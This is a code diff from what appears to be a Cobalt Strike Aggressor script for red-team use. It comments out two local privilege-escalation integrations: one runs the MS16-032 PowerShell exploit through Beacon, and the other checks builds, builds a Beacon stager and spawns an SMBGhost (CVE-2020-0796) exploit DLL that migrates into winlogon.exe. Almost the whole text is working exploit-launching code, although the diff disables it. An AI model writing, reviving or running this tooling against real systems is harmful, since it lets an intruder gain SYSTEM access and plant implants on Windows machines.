@@ -191,61 +191,61 @@ beacon_exploit_register("ms16-016", "mrxdav.sys WebDav Local Privilege Escalatio
 
 # Integrate ms16-032
 # Sourced from Empire: https://github.com/EmpireProject/Empire/tree/master/data/module_source/privesc
-sub ms16_032_elevator {
-	local('$handle $script $oneliner');
+# sub ms16_032_elevator {
+# 	local('$handle $script $oneliner');
 
-	# acknowledge this command
-	btask($1, "Tasked Beacon to execute $2 via ms16-032", "T1068");
+# 	# acknowledge this command
+# 	btask($1, "Tasked Beacon to execute $2 via ms16-032", "T1068");
 
-	# read in the script
-	$handle = openf(getFileProper(script_resource("modules"), "Invoke-MS16032.ps1"));
-	$script = readb($handle, -1);
-	closef($handle);
+# 	# read in the script
+# 	$handle = openf(getFileProper(script_resource("modules"), "Invoke-MS16032.ps1"));
+# 	$script = readb($handle, -1);
+# 	closef($handle);
 
-	# host the script in Beacon
-	$oneliner = beacon_host_script($1, $script);
+# 	# host the script in Beacon
+# 	$oneliner = beacon_host_script($1, $script);
 
-	# run the specified command via this exploit.
-	bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $2 $+ \"", $oneliner);
-}
+# 	# run the specified command via this exploit.
+# 	bpowerpick!($1, "Invoke-MS16032 -Command \" $+ $2 $+ \"", $oneliner);
+# }
 
-beacon_elevator_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_elevator); 
+# beacon_elevator_register("ms16-032", "Secondary Logon Handle Privilege Escalation (CVE-2016-099)", &ms16_032_elevator); 
 
 # Integrate windows/local/cve_2020_0796_smbghost from Metasploit
 # https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/cve_2020_0796_smbghost.rb
-sub cve_2020_0796_exploit {
-	local('$stager $winbuild');
+# sub cve_2020_0796_exploit {
+# 	local('$stager $winbuild');
 
-	# check if we're on an x64 system and error out if we're not
-	if (!-is64 $1) {
-		berror($1, "cve-2020-0796 exploit is x64 only");
-		return;
-	}
+# 	# check if we're on an x64 system and error out if we're not
+# 	if (!-is64 $1) {
+# 		berror($1, "cve-2020-0796 exploit is x64 only");
+# 		return;
+# 	}
 
-	# check the windows version
-	$winbuild = binfo($1, "build");
-	if ($winbuild != 18362 && $winbuild != 18363) {
-		berror($1, "This exploit only supports Windows 10 versions 1903 - 1909");
-		return;
-	}
+# 	# check the windows version
+# 	$winbuild = binfo($1, "build");
+# 	if ($winbuild != 18362 && $winbuild != 18363) {
+# 		berror($1, "This exploit only supports Windows 10 versions 1903 - 1909");
+# 		return;
+# 	}
 
-	# note: this must be 0 or null. exploit will fail if compression is enabled.
-	# reg queryv x64 HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters DisableCompression
+# 	# note: this must be 0 or null. exploit will fail if compression is enabled.
+# 	# reg queryv x64 HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters DisableCompression
 
-	# acknowledge this command
-	btask($1, "Task Beacon to run " . listener_describe($2) . " via cve-2020-0796", "T1068");
+# 	# acknowledge this command
+# 	btask($1, "Task Beacon to run " . listener_describe($2) . " via cve-2020-0796", "T1068");
 
-	# generate our shellcode. Use 'thread' exit option as this DLL implementation migrates into winlogon.exe
-	$stager = payload_local($1, $2, "x64", "thread");
+# 	# generate our shellcode. Use 'thread' exit option as this DLL implementation migrates into winlogon.exe
+# 	$stager = payload_local($1, $2, "x64", "thread");
 
-	# prepend our length to the shellcode
-	$stager = pack("I-", strlen($stager)) . $stager;
+# 	# prepend our length to the shellcode
+# 	$stager = pack("I-", strlen($stager)) . $stager;
 
-	# spawn a Beacon post-ex job with the exploit DLL
-	bdllspawn!($1, getFileProper(script_resource("modules"), "CVE-2020-0796.x64.dll"), $stager, "cve-2020-0796", 5000);
+# 	# spawn a Beacon post-ex job with the exploit DLL
+# 	bdllspawn!($1, getFileProper(script_resource("modules"), "CVE-2020-0796.x64.dll"), $stager, "cve-2020-0796", 5000);
 
-	# link to our payload if it's a TCP or SMB Beacon
-	beacon_link($1, $null, $2);
-}
+# 	# link to our payload if it's a TCP or SMB Beacon
+# 	beacon_link($1, $null, $2);
+# }
 
-beacon_exploit_register("cve-2020-0796", "SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796)", &cve_2020_0796_exploit);
+# beacon_exploit_register("cve-2020-0796", "SMBv3 Compression Buffer Overflow (SMBGhost) (CVE 2020-0796)", &cve_2020_0796_exploit);
